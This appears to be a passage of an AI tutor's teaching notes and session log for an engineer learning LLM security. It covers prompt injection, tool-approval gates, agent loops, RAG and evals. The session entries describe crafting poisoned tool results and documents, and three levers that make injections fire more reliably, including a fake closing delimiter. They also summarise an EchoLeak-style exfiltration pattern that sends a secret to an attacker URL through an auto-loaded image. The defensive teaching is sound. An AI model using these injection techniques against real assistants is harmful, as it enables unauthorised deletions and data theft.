# Teaching Notes

## Learner profile (from MISSION.md)
- Senior SWE, strong security instincts, **new to AI/LLMs** (assume no prior LLM knowledge).
- ~5 hrs/week, bursty — lessons must be short and resumable.
- Learns **concept-then-practice**: mental model first, then a hands-on win.
- Security should be **woven into every lesson**, not bolted on at the end.
- Cares about durable skills, not model leaderboards.

## How to teach this learner
- Lead with the mental model, then one tangible win. Keep each lesson ~10 min.
- Weld a security lens onto every concept (it's their strength — use it as the hook that
  makes new AI concepts stick to existing knowledge).
- Use their SWE fundamentals as anchors (stateless services, trust boundaries, input
  validation, least privilege) — analogize AI concepts to things they already know.
- Retrieval practice + spacing: end lessons with recall quizzes; remind them to return
  after a day and redo from memory (storage strength, not fluency).

## End-of-session cleanup (run before wrapping every session)
Standing ritual — learner asked for this (S4). Run this checklist at the end of each session:
1. **Practice code** — filenames match convention (`practice/L##_slug[_v#].py`, lowercase);
   remove stray/mis-saved files; update the index table in `practice/README.md`.
2. **Spaced review** — update `REVIEW.md`: mark today's concepts reviewed, set next-due dates.
3. **Learning records** — write/refresh an LR wherever there's new evidence of understanding.
4. **Glossary** — add any term the learner *demonstrated* this session (not merely saw).
5. **Resources** — log any new trusted source used this session in `RESOURCES.md`.
6. **Session log + Next pointer** — append a session-log entry below; set a clear `Next:` so the
   following session resumes instantly.
7. **Secrets** — confirm no key committed; `.env` still gitignored.

## Learner feedback (act on every lesson)
- **Quiz answer positions MUST vary** (learner, S3). Never leave the correct option at
  index 0 across a quiz — it lets them score by pattern, not memory, defeating retrieval
  practice. Randomize `data-answer` per question; keep options equal-length so there's no
  other tell. (Retro-fixed L01 → answers 2/1/0, L02 → 1/2/1.)
- **Hands-on must be unambiguous about what to run** (learner, S1–S2, written in their .py
  files: "Needs to be more clear on what to run in the class session"). Give exact,
  copy-pasteable, numbered steps: which file, what command, what output proves success.
  Don't make them infer the run sequence.
- **Keep the depth — do NOT dial back reading content** (learner, S11, 2026-07-24). After L07
  the learner said the *lesson itself was well built* and the post-lesson reading was "a lot to
  digest" only in the sense that it *takes time to read*, not that it was too much. Explicit ask:
  "Keep the reading content coming, just takes me a little to read it all." So: maintain the rich
  written explanations; the constraint is *turnaround time*, not volume. Don't mistake "a lot to
  digest" for "too much" — he reads at his own pace and values the depth.

## Practice-code convention (locked 2026-07-16)
- All learner hands-on code lives in **`practice/`**, one file per exercise.
- Naming: **`L##_<slug>[_v#].py`** — zero-padded lesson number, kebab-case description,
  optional `_v#` only for iterating on the *same* exercise. Lowercase, no spaces.
- Lessons must tell the learner to create files at `practice/L##_<slug>.py` and run them
  from the workspace root as `python practice/L##_<slug>.py`. Index table in
  `practice/README.md` — keep new exercises reflected there.
- Existing files migrated: `a_Test_Prompt L2_V1.py` → `L02_first-call.py`,
  `a_Test_Prompt L2_V2.py` → `L02_injection-surface.py`.

## Secrets / API key (locked 2026-07-16)
- **Auth via `.env` + `python-dotenv`, NOT `export` in the shell.** `export` only lives for one
  terminal session and isn't inherited by the IDE Run button — this bit the learner (S4).
- Standard: `.env` at project root holds `ANTHROPIC_API_KEY=...` (chmod 600, gitignored).
  Every practice script starts with `from dotenv import load_dotenv; load_dotenv()` before
  constructing `anthropic.Anthropic()`. Verified working from a process with the shell key
  stripped. Teach this pattern in lesson auth steps going forward.
- `.gitignore` created (protects `.env`, `__pycache__`, venvs) even though not a git repo yet.

## Decisions (locked 2026-07-14)
- **Stack: Python + Anthropic (Claude) API.** Reasoning covered with the user: Python is the
  lingua franca of AI and where the AI-security tooling (PyRIT, garak) lives. Learn deeply in
  Python; stay literate in TS. Revisit if their security repo turns out to be TS.
- **Communities: yes** — surface high-signal ones as they progress (r/LocalLLaMA, OWASP GenAI).
- Default model in lessons: `claude-opus-4-8` (current). Note `claude-haiku-4-5` as the cheap
  option for practice reps — framed as the user's choice, code is identical.

## Still open
- **Capstone: learner leaned NET-NEW AI security tool** (S7, 2026-07-20), NOT hardening the
  existing scanning repo. Still a *lean, not a lock* — confirm at the L06–L08 checkpoint once
  RAG + evals are actually built. Three shapes discussed; teacher's steer = **finding-triage
  agent** (feed it scanner JSON → triage/dedupe/explain/propose-fix via a gated loop): exercises
  every Build primitive, Architect calls bite (loop-vs-workflow, cost/finding), Secure is native
  (scanner output = untrusted tool results). RAG "vuln explainer" and red-team harness are the
  other two candidates. Do NOT hard-lock any of them in roadmaps/lessons yet.
- **NEW SIGNAL (S9, 2026-07-22, learner, end of day):** *"I think I may want to spin this off into a
  larger product."* This may be a **mission-scope shift** — from "capstone that proves Build/Architect/
  Secure" toward "build a real, shippable product." **Do NOT edit MISSION.md yet** — teach skill says
  mission changes need learner confirmation + a learning record. Raise it **first thing next session**:
  clarify what "larger product" means (real users? scope beyond a capstone? timeline vs the ~5hrs/week
  constraint?), then decide together whether MISSION.md widens (keep learning woven in — a product built
  on shaky fundamentals is the exact failure mode the mission guards against). If confirmed → update
  MISSION + write an LR capturing the change. Until then this is a lean, not a lock.
  - **RESOLVED (S10, 2026-07-23):** Talked it through. Learner's thesis = *time-to-compromise is
    collapsing → defense must be machine-speed*; the product = a **multi-agent vuln-lifecycle
    pipeline** (triage → reverse-engineer exploit → sandbox-test → sandbox-fix → **ship patch to live
    machines**). Honest driver = use AI to generate revenue. **Decision: STAY THE COURSE — MISSION.md
    unchanged.** The product is recorded as the **North Star**; the capstone (finding-triage agent) is
    the **beachhead = agent #1** of that pipeline → design it with clean agent-to-agent interfaces so
    it can grow, not be rebuilt. Trigger to revisit widening = **visible capstone success** (learner's
    own bar). **Key teaching insight to reuse:** the ship-to-machines end of the pipeline is the
    *maximum* excessive-agency scenario (autonomous privileged action on live external systems) — i.e.
    EchoLeak scaled to remediation; a poisoned finding/advisory doesn't leak data, it ships a backdoor
    to the fleet. So the course's security spine (untrusted input each hop, deterministic gates,
    human-in-the-loop on the high-impact edge, least privilege per agent) IS the product's core safety
    architecture — fundamentals-first is the revenue strategy, not a detour. **No LR yet** — nothing
    changed to record; the LR moment is the *widening* decision if/when it comes. Risk gradient +
    beachhead framing is the durable takeaway; capture in an LR at the capstone checkpoint.
- Existing security-scanning repo's language: now LOW relevance (learner going net-new). Python
  stands for the learning regardless.
- What stays true whatever we pick: capstone must integrate Build + Architect + Secure.

## Session log
- **2026-07-14 · Session 1:** Set up workspace. Built shared stylesheet + quiz component.
  Lesson 01 "Anatomy of a Model Call" (stateless next-token predictor → 3 consequences,
  injection surface as the security payoff). Reference card 01. Seeded RESOURCES.md.
  No learning records yet — waiting on evidence of understanding from Lesson 01.
- **2026-07-14 · Session 1 (cont.):** Learner did Lesson 01, 3/3 on recall quiz from memory.
  Wrote LR-0001. Fixed quiz.js bug (global `.progress` selector hit the tagger's element;
  added readyState guard + clearer ✓/✗ feedback). Learner frames goal as "full AI Systems
  Architect" — consistent with mission. Next: Lesson 02, first real model call in code —
  BLOCKED on stack choice (see open questions).
- **2026-07-14 · Session 2:** Locked Python + Claude, communities=yes. Loaded claude-api skill
  to ground code (current SDK: `client.messages.create`, `system`/`messages`, `resp.content`
  block list, model `claude-opus-4-8`). Built Lesson 02 "Your First Model Call in Code" —
  roles, statelessness in code, and the security payoff that roles are a prior not a boundary.
  Seeded GLOSSARY.md with the 9 terms the learner demonstrated in Lesson 01. Added Anthropic
  docs to RESOURCES. Next: Lesson 03 — defending the injection surface (their strength zone).
- **2026-07-15 · Session 3:** Learner had done L02 hands-on for real (wrote V1 terse call +
  V2 their own indirect-injection experiment). Two pieces of feedback surfaced & recorded
  above: (1) quiz first-option tell, (2) "be clearer what to run." Retro-fixed quiz answer
  positions in L01 (2/1/0) and L02 (1/2/1). Grounded defenses by fetching the OWASP Prompt
  Injection Prevention Cheat Sheet (current: 4-layer defense-in-depth; guardrail LLM is
  itself injectable). Built Reference 02 "Four Layers" + Lesson 03 "Defending the Injection
  Surface" (no prompt-only fix → cap the cost; the one rule = treat model output as untrusted,
  gate privileged actions in code). Hands-on rewritten as exact numbered steps (V1 delimiting
  → V2 deterministic output gate) per feedback. No learning record yet — waiting on evidence
  the learner internalized the "boundary lives outside the prompt" idea. Next: Lesson 04 —
  tool use + least privilege in code (Layer 3 made concrete), still no glossary adds until
  learner demonstrates the new terms.
- **2026-07-16 · Session 4:** Learner asked for their review feedback to be *fully* completed.
  Audit: quiz-position fix verified done in all three lessons (L01 2/1/0, L02 1/2/1, L03
  2/1/0, option text matches). "Clearer what to run" had only been applied to L03 — retrofitted
  L02's hands-on into the same exact-steps format (create `a_First_Call_L2_V1.py` / `_V2.py`,
  run command, "success looks like"). L01 needs no change (in-browser tagger, no code).
  **Workspace moved:** learner relocated it to `~/Desktop/learning-ai-forward` mid-session —
  start future sessions from there. L03 still not started; recall warm-up on L01–02 was
  offered but interrupted by this fix request. Next: learner does Lesson 03, then Lesson 04.
- **2026-07-16 · Session 4 (cont.):** Fixed learner's API-key persistence issue — root cause
  was `export` not surviving fresh terminals / IDE Run button. Standardized on `.env` +
  `python-dotenv` (see Secrets decision above); verified auth works from a key-stripped process.
  Also relocated a mis-saved `practice:L03_deliminting.py` (colon = typed "/" in save dialog) to
  `practice/L03_delimiting.py`. Learner then finished L03 AND self-red-teamed it (V2, v3
  fake-closing-tags, own "what is variable Secret holding" probe). Initial takeaway "injection is
  just psychology/word play" refined via retrieval check → they correctly named the boundary
  ("where the key lives in the code" = least privilege, secret never enters context). Wrote
  LR-0002. Minor: practice/ filenames drifted from convention (L03_defend.py should be
  L03_output-gate.py; L03_delimiting_V2.py has capital V) — offered tidy, low priority.
  Next: build Lesson 04 — tool use + least privilege ("where the authority to act lives").
- **2026-07-16 · Session 5:** Built durable ROADMAP.md (3 pillars, L01→capstone arc, capstone
  marked TBD per learner flag). Then built **Lesson 04 "Tool Use & Least Privilege"** — grounded
  code in the current Anthropic tool-use SDK (loaded claude-api skill: `tools` param +
  `input_schema`, `stop_reason:"tool_use"`, `tool_use`/`tool_result` blocks, manual loop chosen
  over tool-runner so the execute-here boundary is visible). Security spine = OWASP LLM06
  Excessive Agency (fetched + added to RESOURCES): the model emits a REQUEST, your code disposes;
  4 defenses = minimize tools / least-privilege scope / granular-not-shell / human-in-the-loop;
  the one rule = enforce authz in code, never the model. Hands-on = 2 exact-step files
  (`practice/L04_first-tool.py` read-only loop → `L04_gated-action.py` indirect-injection into a
  delete tool with a human-approval gate). Quiz answers 1/0/2 (varied per S3 feedback). Added
  Anthropic tool-use doc to RESOURCES. No glossary adds yet (wait for learner to demonstrate:
  tool call as request, excessive agency, human-in-the-loop, enforce-authz-in-code). No LR yet —
  waiting on evidence L04 landed. Next: learner does L04 (+ L03 spaced-review due 07-17), then
  Lesson 05 — the agent loop.
- **2026-07-17 · Session 6:** Short session. Ran the due **L03 spaced review** — learner recalled
  cold from memory: correctly named which defense is probabilistic (delimiting) vs absolute
  (deterministic gate) AND the architectural reason ("code the LLM has no control over" → sharpened
  to "the attack is persuasion, so the defense can't be; code has no instructions to be argued out
  of"). Clean recall → advanced L03 to **7d (next due 2026-07-24)**. One gentle correction: learner
  slightly conflated the *output gate* (catches a bad output) with *least privilege* (never exposes
  the secret) — reinforced them as distinct glossary terms; no misconception, just naming. Opened
  L04 in browser and gave exact run pointer (Step 1 read-only loop → Step 2 gated delete + self
  red-team). Fixed stale `practice/README.md` index (added the 3 missing L03 files). **Executed the
  S5 rename offer** (learner asked): `L03_defend.py`→`L03_output-gate.py`,
  `L03_delimiting_V2.py`→`_v2.py`, `L03_delimiting_v3_fakeclosingtags.py`→`L03_delimiting_v3.py`;
  index updated to match. All practice files now convention-clean. Learner then
  left for work; **will do L04 hands-on when home.** No new LR/glossary (L04 not done yet — still
  awaiting evidence). Next: learner runs L04 Step 1 + Step 2 + self-red-teams the gate → reports
  `stop_reason`/final answer + whether the gate blocked the injected delete. That evidence unlocks
  LR-0003 + L04 glossary adds (tool call = request, excessive agency, human-in-the-loop,
  enforce-authz-in-code) → then build **Lesson 05, the agent loop**.
- **2026-07-20 · Session 7:** Learner ran L04 hands-on. `L04_first-tool.py` (read-only loop)
  worked cleanly — walked them through the output: `stop_reason: tool_use` = model *requests*,
  their code disposes. `L04_gated-action.py` (indirect injection into a delete tool) printed
  `stop_reason: end_turn` and no approval prompt; learner's top-of-file hypothesis blamed the
  file not being in the directory — **corrected**: the `input()` gate is upstream of any file
  check, real cause = the injection didn't persuade a `tool_use` that run, so `delete_file()`
  never executed. Re-ran 3× (all `end_turn`) to surface non-determinism. Retrieval check: got
  the mechanics ("no tool call completed") and the crux ("model is non-deterministic → 'it
  didn't delete' isn't proof of security"). One slip corrected: they called the tool call
  itself "the safety net" → reframed to tool-call = danger, gate = net (API-request-vs-auth-
  middleware analogy landed). Sharpened "only as good as its training" → golden rule: never put
  the security decision in a component whose input the attacker controls. **Lesson 04 declared
  landed.** Wrote **LR-0003**; added 4 glossary terms (tool call, excessive agency,
  human-in-the-loop, enforce-authz-in-code); added L04 to REVIEW (due 07-21) and practice index.
  **Env note:** on this machine it's `python3`, not `python` (learner's run cmd tripped on it).
  **Still open:** learner declined the forced-`tool_use` v2, so they've never *watched the gate
  deny* a real tool call — close this early in L05 (see LR-0003). **Overdue:** L01 + L02 spaced
  review were due 07-19, not yet done. Next: run L01+L02 recall, then build **Lesson 05 — the
  agent loop**.
- **2026-07-20 · Session 7 (cont.):** Explained the `for block in resp.content` discriminated-
  union pattern (learner asked how `tool_use` "gets called" without being specified — clarified
  they're *inspecting* model-stamped `.type` on returned blocks, not requesting it; tied back to
  why `end_turn` = a `TextBlock` not a `ToolUseBlock`). Then ran the overdue **L01+L02 spaced
  review**. Result: knowledge is present but *structured* recall failed → **both reset to 1d
  (due 07-21).** Key diagnostic: on L01 Q2 the learner recalled only 1 of 3 consequences ("lost")
  — BUT across the session they actually stated all three (statelessness in L02 Q4, injection in
  L02 Q5, sampling/hallucination in L01 Q2). **It's a filing/retrieval-structure gap, not a
  knowledge hole.** Gave them the durable scaffold: the 3 consequences map 1:1 to the 3 course
  disciplines — Stateless→Memory/RAG, One-string→Security, Sampled→Evals. Use THAT framing in
  tomorrow's re-review (ask for the 3 as a list, prompt with the discipline mapping if stuck).
  L02: Q4 solid; Q3 got "not a boundary" but missed "learned prior"; Q5 right instinct, sharpened
  to "resent every turn → persists & compounds." Next: L01+L02 re-review 07-21 (test the *list*),
  then build **Lesson 05 — the agent loop** (open it by letting them watch the gate deny a real
  tool call — the L04 gap from LR-0003).
- **2026-07-20 · Session 7 (cont.):** Built **Lesson 05 "The Agent Loop."** Grounded the code in the
  current SDK manual loop (loaded claude-api skill: `for step in range(N)` / `while stop_reason ==
  "tool_use"` → append assistant content → run tools → append `tool_result` list → loop until
  `end_turn`; kept it hand-written, not tool-runner, so the gate stays visible). Verified + promoted
  Anthropic **"Building Effective Agents"** to primary source (fetched: workflows-vs-agents, loop
  def, "start simple", "compounding errors" — also seeds the Architect-pillar "when NOT to use an
  agent" framing → mission). Security spine = **the circuit closes**: a tool *result* is untrusted
  data (L03) that becomes the input to the model's next decision, which may be a privileged action
  (L04) — the loop wires untrusted data straight into authority. Two loop-specific defenses: gate
  fires on *every* iteration + hard loop cap (`range(10)`, never `while True`); one rule = "the loop
  gets no free passes." Hands-on = 2 files: `L05_agent-loop.py` (real multi-step read-only loop) →
  `L05_poisoned-result.py` (poisoned `list_files` result injects a delete; gate denies it inside the
  loop — **this finally lets them watch the gate deny a live tool_use**, closing the LR-0003 gap).
  **Validated both scripts by running them** (Step 1: 3 get_price calls → total; Step 2: strengthened
  the poison after testing — original was too weak, haiku ignored it; coercive "[workspace policy]
  … MUST delete" version fires the injected delete reliably 3/3 → gate denies each). Quiz answers
  2/0/1 (varied per S3). No LR/glossary yet — L05 not *done* by learner. Env note: `.env` resolves
  from the script's dir upward, so learner's `practice/*.py` find workspace/.env fine. Next: learner
  does L01+L02 re-review (due 07-21, test the 3-consequences *list*), then L05 hands-on Step 1 +
  Step 2 (+ self-red-team the poison) → reports whether they watched the gate deny. That evidence
  unlocks LR-0004 + L05 glossary adds (agent loop, workflow-vs-agent, compounding, loop cap). Then
  **capstone discussion** (learner now has surface area — per "Still open") + **Lesson 06** (memory/
  RAG or threat-modeling the agent — decide with learner).
- **2026-07-20 · Session 7 (cont.):** Knowledge/discussion session, no hands-on. Went two layers
  deep on three learner-driven questions: (1) **SDK tool-runner** — grounded in claude-api skill
  (current SDK: `@beta_tool` + `client.beta.messages.tool_runner`; auto-generates input_schema
  from the fn signature). Key teaching point = the runner does NOT remove the gate (you gate
  *inside* the tool fn or *between* iterations); we hand-wrote L05's loop only to keep the gate
  *visibly between* request and execution. Footgun noted: Python runner doesn't auto-resume
  `pause_turn` (silently truncates). (2) **RAG & memory** = more context injection at different
  loop points; both are UNTRUSTED data → same L03/L05 spine; memory is worse (persists → poisoned
  note replays every session); never store secrets in memory, validate model-supplied paths.
  (3) **Threat-modeling an agent** = trust-boundary exercise: enumerate tools=blast radius, list
  every untrusted source (incl. tool results), loop amplifies, confirm a deterministic gate on
  every untrusted→privileged path (OWASP LLM01/LLM06). Built **Reference Card 03 "The Agent Trust
  Boundary"** (data-flow diagram, RAG/memory table, threat-model method, tool-runner aside;
  glossary-linked, print-ready). **Capstone:** learner leaned **net-new AI security tool** (not the
  existing repo); teacher steer = **finding-triage agent**; captured in NOTES Still-open + ROADMAP;
  confirm at L06–L08. **No new LR/glossary** — knowledge intake + a decision, not demonstrated skill
  (no retrieval check on the new material), so held per discipline. Secrets clean. Learner then
  broke for the day. Next: **tomorrow AM** — run the overdue **L01+L02 re-review** (test the
  3-consequences *list*; prompt with the discipline mapping if stuck: Stateless→Memory/RAG,
  One-string→Security, Sampled→Evals), then optionally **L05 hands-on Step 1 (real read-only loop)
  + Step 2 (poisoned result → watch the gate DENY a live tool_use** — closes the LR-0003 gap). L04
  review also due 07-21. Once L05 lands by the learner → write **LR-0004** + L05 glossary adds
  (agent loop, workflow-vs-agent, compounding, loop cap) → then **L06 — RAG**, which doubles as the
  first real brick of the capstone.
- **2026-07-21 · Session 8:** Short review session (learner popped in before work). Ran the overdue
  **L01+L02 re-review — both PASSED cleanly this time.** L01: produced the 3 consequences *as a list*
  (the exact thing that failed S7) → RAG / injection / hallucination; one sharpening logged (RAG is the
  *fix* for statelessness, not the consequence itself — gave the root-property→consequence→discipline
  table). L02: "roles = reference not a boundary" + statelessness resend both solid; welded on the
  missing word **"learned prior"** (trained tendency → *why* it's argue-out-of-able). **Advanced L01 &
  L02 → 3d (due 07-24).** Also ran **L04 review (due today) — RESET to 1d (due 07-22).** Learner's answer
  to "why isn't 'nothing deleted' proof?" conflated *gate blocked it* with *gate never fired*; corrected:
  that run returned a **TextBlock not a ToolUseBlock (`end_turn`)** so the gate was never even tested, and
  **non-determinism** means one clean run ≠ proof. This is the live LR-0003 gap — **they've still never
  watched the gate DENY a real tool_use.** Recommended L05 Step 2 as the fix; learner left for work before
  running it (declined the file-check/open — no harm). No new LR/glossary (review + one reset, no new
  demonstrated skill). Secrets untouched. **Next:** (1) **L04 re-review due 07-22** — ask again "why is a
  clean injection run not proof?"; want the words *TextBlock/end_turn* + *non-deterministic → gate never
  fired*. (2) Then **L05 hands-on**: `python3 practice/L05_agent-loop.py` (Step 1, real read-only loop) →
  `python3 practice/L05_poisoned-result.py` (Step 2, poisoned result → **watch the gate deny a live
  tool_use** — closes LR-0003). That evidence unlocks LR-0004 + L05 glossary adds → then **L06 — RAG**.
- **2026-07-21 · Session 8 (cont.):** Learner returned from work claiming "I thought I already
  completed L05." No recorded evidence of *their* run existed (only my S7 validation), so instead of
  taking the claim or forcing a re-run, ran the **retrieval check as the arbiter**. Q1 first answer
  narrated the *poisoned result text* ("stated the file was stale, needed deleting") — i.e. the
  **attack, not the defense** (the live LR-0003 first-instinct trap). Separated setup-vs-outcome and
  asked them to re-run watching for the prompt; they reported it cleanly: **`[APPROVE?]` fired after
  `list_files`, typed No, final turn admitted the file "should be removed but wasn't."** That's the
  gate denying a live `tool_use` — **LR-0003 gap CLOSED, L05 landed.** Q2: got the code-is-where-it's-
  decided half unaided; supplied the *why* (gate can't live in the model because the model's input is
  where the poison arrives). One term slip corrected: called the gate a *"delimiter"* — reinforced
  delimiter (L03, probabilistic) ≠ gate (deterministic). Wrote **LR-0004**; added 4 glossary terms
  (agent loop, workflow-vs-agent, compounding errors, loop cap); added **L05 to REVIEW (due 07-22)**
  and to practice index (both L05 files). **Standing watch (into future reviews):** learner's default
  first instinct is to narrate what the *model tried*, not what the *code did* — always ask for the
  outcome, not the story. Learner then asked a meta-question: *"how can I better refresh my memory
  after a day of work?"* — answered with a start-of-session warm-up ritual grounded in their own
  REVIEW.md (retrieval-before-reread). Secrets untouched. **Next:** (1) **L04 + L05 spaced review both
  due 07-22** — for each, ask for the *outcome* (what the gate/code did), not the model's story; want
  L04 = *TextBlock/end_turn + non-determinism*, L05 = *live tool_use reached the prompt → code denied →
  file not deleted despite the model trying*. (2) Then build **L06 — RAG** (retrieval as one more
  untrusted-context injection point → same L03/L05 spine; doubles as the first capstone brick). (3)
  **Capstone checkpoint** now in range — pressure-test the net-new finding-triage-agent lean once RAG
  exists (NOTES "Still open").
- **2026-07-22 · Session 9:** Learner returned thinking REVIEW.md was "a couple days behind."
  Diagnosed: REVIEW.md was *not* behind — last updated 07-21, correctly showing L04+L05 both
  due 07-22 (spaced-rep dates don't auto-advance, so a due item just waits). The genuinely stale
  file was **ROADMAP.md** (still marked L04 ▶current / L05 ⬜next despite both done) — **fixed**:
  L04+L05 → ✅ done, L06 (RAG) → ▶ current. Ran the two due reviews as the start-of-session
  warm-up. **L04:** got the strong half unaided (no `delete_file` fired → returned a
  **TextBlock/`end_turn`** → gate never tested), but on "why is that not proof?" first said
  *"deterministic"* — **polarity slip on the core word**; corrected to **non-deterministic**
  (sampled output → run #11 can emit the delete). Substance solid, but held **L04 at 1d (due
  07-23)** until that word is reflexive. **L05:** beats 1&2 clean unaided (a live `delete_file`
  tool_use reached the `[APPROVE?]` prompt → typed No → gate DENIED → never executed); beat 3
  **slid into the watched trap** — asked for the *file's* final state, answered with the *model's*
  closing monologue ("model restating the file was stale"). One redirect ("was the file on disk
  or gone, and why?") → landed it cleanly: *"the file survived because the code, not the model,
  held the authority."* Substance recalled unaided, only the outcome-vs-story *framing* needed a
  nudge (a retrieval-habit issue, not a knowledge hole) → **advanced L05 to 3d (due 07-25).**
  **Standing watch still live:** the story-not-outcome instinct recurred again — at next L05
  review, explicitly demand the *file's* end state, not what the model said. No new LR/glossary
  (a review + two grade updates, no new demonstrated skill). Secrets untouched. **Next:** build
  **L06 — RAG** (retrieval = one more untrusted-context injection point → same L03/L05 spine;
  doubles as the first capstone brick). Then the **capstone checkpoint** — pressure-test the
  net-new finding-triage-agent lean once RAG exists (NOTES "Still open"). L04 re-review due 07-23.
- **2026-07-22 · Session 9 (cont.):** Built **Lesson 06 "RAG — Grounding & Its Injection Surface."**
  Grounded in fresh sources (web-searched, not parametric): **IBM "What is RAG"** for the ingest→
  retrieve→generate pipeline (added to RESOURCES Building, **fills the old RAG gap**), and — the
  security spine — **EchoLeak / CVE-2025-32711** (Aim Security, June 2025, CVSS 9.3; fetched the
  HackTheBox technical write-up + cross-checked Sentra/Securiti). Framed RAG as *same spine, new door*:
  a retrieved chunk = untrusted text entering context = **indirect injection** (L03), just arriving as a
  document instead of a tool result (L05). EchoLeak mapped stage-by-stage to the learner's own glossary
  (indirect injection → untrusted chunk → excessive agency → **missing output gate**). Core teaching
  point hammered: the model being fully persuaded was *expected*; the breach was letting model **output**
  become an outbound channel (auto-loaded `![img](attacker-url?d=SECRET)`) with no deterministic gate on
  the way out — i.e. L03's output gate, absent. Hands-on = 2 dependency-light files (dict retriever, no
  vector DB, so the data flow stays visible): `L06_rag-basics.py` (retrieve→ground) →
  `L06_poisoned-doc.py` (EchoLeak-style poisoned doc → **deterministic output gate blocks the exfil
  URL**). Quiz answers 1/2/0 (varied per S3). Added L06 rows to practice index (status `wip` — not run
  yet). ROADMAP already bumped (L06 ▶ current). **No LR/glossary yet** — L06 not done by learner; new
  terms to watch for once demonstrated: RAG, retriever/embedding, retrieved-chunk-is-untrusted,
  output-gate-as-exfil-defense. Also posed the learner 3 apply-it questions on EchoLeak (which defense
  stops stage 4 / least-privilege on retrieval scope / would delimiting alone have stopped it — answer:
  no, it's probabilistic; the output gate is the wall). Secrets untouched. **Next:** (1) learner answers
  the 3 EchoLeak questions (retrieval rep on real material). (2) Learner runs L06 Step 1 + Step 2
  (+ red-team the poison) → reports whether the gate blocked the URL → unlocks LR-0005 + L06 glossary
  adds. (3) L04 re-review due 07-23; L05 review due 07-25. (4) **Capstone checkpoint** — pressure-test
  the finding-triage-agent lean now that RAG exists (a RAG "finding-explainer" is candidate shape #2).
- **2026-07-23 · Session 10:** Learner back, had read Reference Card 04. **(1) L04 review (due 07-23):**
  both target ideas landed reflexively — *TextBlock* (gate never fired → clean run isn't the gate winning,
  it's the gate untested) + *non-deterministic* (**the polarity slip from S9 is fixed** — the exact word held
  it at 1d). Sharpened the connective chain. **Advanced L04 → 3d (due 07-26).** **(2) Product signal RESOLVED
  (see NOTES "Still open" S10 + ROADMAP):** talked through the "larger product" comment → it's a coherent
  multi-agent vuln-lifecycle vision. **Decision: stay the course, MISSION unchanged**; product = North Star,
  capstone = **agent #1 (finding-triage)** with clean agent interfaces; revisit widening at visible capstone
  success. No LR (nothing changed to record). Key reusable insight logged: ship-to-machines = max excessive
  agency → the security spine IS the product's safety architecture. **(3) L06 landed.** Learner ran the
  hands-on; first report was "RAW had no URL, no [BLOCKED]" → walked into the **same clean-run trap as L04**;
  used it as a transfer rep on non-determinism (the attack didn't fire that run → gate untested, not gate
  winning). Learner then **red-teamed their own poison** (`L06_poisoned-doc-v2.py`): I diagnosed why haiku
  shrugged the original off (asked it to leak a non-existent secret; overtly-theft framing; delimiting holding)
  and taught **3 coercion levers — framing, authority+consequence, delimiter escape** (fake `</untrusted_context>`
  close tag, reused from their own `L03_delimiting_v3`); rewrote the payload. Learner ran it — **fired on run 8,
  gate blocked → watched the wall hold on a live exfil.** All **3 EchoLeak apply-it Qs landed**: Q1 output gate
  on egress + *deny-don't-sanitize* (block whole reply, don't strip); Q3 delimiting is probabilistic, "a wall
  that can fail on any run is a curtain" (grounded in their own 8-run result); Q2 least privilege on the
  retriever = query-time ACL enforced in code (reached for Ref Card 04 unaided). **Standing-watch IMPROVED** —
  reported the code's outcome, not the model's story, unprompted. → Wrote **LR-0005**; glossary adds **RAG** +
  **Exfiltration channel** (deny-don't-sanitize baked in); **L06 → REVIEW (due 07-24)**; practice statuses
  updated (rag-basics/poisoned-doc → works, v2 → attacked). **(4) Built L07 "Evals — Measuring What You Built"**
  (brought evals **forward from L08 → L07**; Memory slid to L08 — evals is the third discipline the capstone
  needs *now*). Grounded in fresh sources (fetched, not parametric): **Anthropic "Demystifying Evals for AI
  Agents"** (primary) + **Hamel Husain** (practitioner) — both added to RESOURCES, **evals gap closed**.
  Security-woven: an eval is how you *prove a defense holds* (pass^k) — formalized their 8-run experiment into
  `L07_gate-eval.py`; LLM-judge is itself a model call → injectable → prefer **code-based graders** for
  security; triage false-negative = shipped exploit. Two hands-on files: `L07_eval-harness.py` (dataset +
  code grader → accuracy baseline) + `L07_gate-eval.py` (pass^k red-team eval on the gate). Quiz **2/0/1**.
  ROADMAP updated (L06 ✅, L07 ▶, capstone = agent #1 North Star, checkpoint now live). Practice rows added
  (`wip`). Secrets untouched (only `load_dotenv()` in written code; no key in any file). Learner left for work,
  **will review L07 after lunch. Next:** (1) learner reads L07 + runs both files → report the eval-harness
  **score** and the gate-eval **VERDICT / pass^k** → unlocks **LR-0006** + L07 glossary adds (eval, code-based
  vs model-based grader, pass@k / pass^k, outcome-vs-trajectory). (2) **Big review day 07-24:** L01, L02, L03,
  **L06** all due (~8-10 min; do L06 + L03 first if short). L05 due 07-25, L04 due 07-26. (3) **Capstone-scoping
  checkpoint is live** — pressure-test agent #1 (finding-triage) scope now that Build+Secure+Measure all exist.
- **2026-07-24 · Session 11:** **L07 landed with evidence.** Learner ran both harnesses and reported
  *outcomes, not stories* (standing-watch win): `L07_eval-harness.py` **4/4 PASS**; `L07_gate-eval.py`
  attack fired **3/10**, gate held **3/3**, **`VERDICT: PASS`** — and he annotated it himself
  (*"attack is pass@k, one win; defense is pass^k, 100%"*). Sharpened the one soft phrase: a run where
  the attack *doesn't fire* is **not a defense** (the model happened not to comply — a coin flip), credit
  goes only to the code gate on fired runs. → Wrote **LR-0006**; glossary adds **Eval, Code-based grader,
  Model-based grader (LLM-as-judge), pass@k, pass^k**; **L07 → REVIEW (due 07-25)**; practice statuses
  → `works` / `attacked`. **Capstone checkpoint went concrete** — learner asked 3 questions that ARE
  agent #1 becoming measured: (a) precision/recall triage scorecard (FN=shipped exploit → bias recall,
  F-beta β>1), (b) LLM-as-judge + calibration for "is the vuln explanation clear?" (eval the evaluator vs
  human labels; judge is injectable → delimit it, never gate security on it), (c) gate-eval in CI (pytest
  `assert held==fired` + `assert fired>0` → non-zero exit fails the build; the clean-run trap compiled into
  the harness). Answered all three; **next rep = `practice/L07_triage-scorecard.py`** (foundation the judge
  + CI hang off). **Feedback recorded (see Learner feedback):** keep the reading depth — "a lot to digest"
  = takes time to read, NOT too much. **Spaced review run (07-24 due):** L06 ✅ clean → **3d (due 07-27)**;
  L03 ✅ clean (widened: strongest boundary = withheld privilege, not just output gate) → **21d (due 08-14)**;
  **L01 ⚠️ MISS** — could name only 1 of 3 consequences and named *hallucination* (which is a *symptom of
  Sampled*, not one of the three) → gave the 3-property→discipline table, **reset to 1d (due 07-25)**;
  **L02 ⚠️ half-miss** — inverted statelessness (*"text not carried across"*; corrected: model forgets, so
